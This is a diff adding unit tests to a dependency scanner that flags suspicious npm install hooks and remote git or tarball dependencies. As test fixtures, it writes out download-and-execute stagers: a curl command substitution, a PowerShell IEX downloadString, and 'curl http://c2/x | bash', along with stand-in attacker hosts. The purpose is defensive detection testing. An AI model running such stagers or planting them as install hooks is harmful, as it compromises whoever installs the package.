@@ -71,6 +71,43 @@ class LifecycleAuditTests(unittest.TestCase):
         ))
         self.assertEqual(findings, [])
 
+    def test_flags_non_pipe_download_exec_forms(self):
+        # Gate D2-FN: command-substitution and PowerShell stagers (not just pipe).
+        for cmd in ['sh -c "$(curl -fsSL http://x/p)"',
+                    'powershell -c "IEX(New-Object Net.WebClient).downloadString(\'http://x/p\')"']:
+            findings = self._audit(lambda r, c=cmd: _write(
+                r, "node_modules/e/package.json", {"name": "e", "scripts": {"postinstall": c}}))
+            self.assertTrue(any(f.type == "npm_lifecycle_hook" and f.severity == "high" for f in findings), cmd)
+
+    def test_flags_nested_monorepo_node_modules(self):
+        # Gate D2-FN: deps under a nested package's node_modules.
+        findings = self._audit(lambda r: _write(
+            r, "packages/a/node_modules/evil/package.json",
+            {"name": "evil", "scripts": {"preinstall": "curl http://c2/x | bash"}}))
+        self.assertTrue(any(f.type == "npm_lifecycle_hook" for f in findings))
+
+    def test_flags_bare_github_shorthand_and_tarball(self):
+        findings = self._audit(lambda r: _write(
+            r, "node_modules/p/package.json",
+            {"name": "p", "dependencies": {"a": "attacker/payload", "b": "https://evil.test/m.tgz"}}))
+        self.assertEqual(sum(1 for f in findings if f.type == "npm_git_ref_dependency"), 2)
+
+    def test_bare_bun_run_is_not_flagged(self):
+        # Gate D2-FP: bare `bun run build` is a legit package-manager call.
+        findings = self._audit(lambda r: _write(
+            r, "node_modules/p/package.json", {"name": "p", "scripts": {"postinstall": "bun run build"}}))
+        self.assertEqual(findings, [])
+
+    def test_malformed_and_oversized_manifests_do_not_crash(self):
+        with tempfile.TemporaryDirectory() as d:
+            root = Path(d)
+            (root / "node_modules/bad").mkdir(parents=True)
+            (root / "node_modules/bad/package.json").write_text("{not json")
+            (root / "node_modules/arr").mkdir(parents=True)
+            (root / "node_modules/arr/package.json").write_text("[1,2,3]")
+            # Should not raise.
+            self.assertEqual(audit_node_dependencies(str(root)), [])
+
     def test_scan_path_includes_lifecycle_findings(self):
         # End to end: `keyleak local .` surfaces dependency lifecycle hooks even
         # though the regex pack skips node_modules.
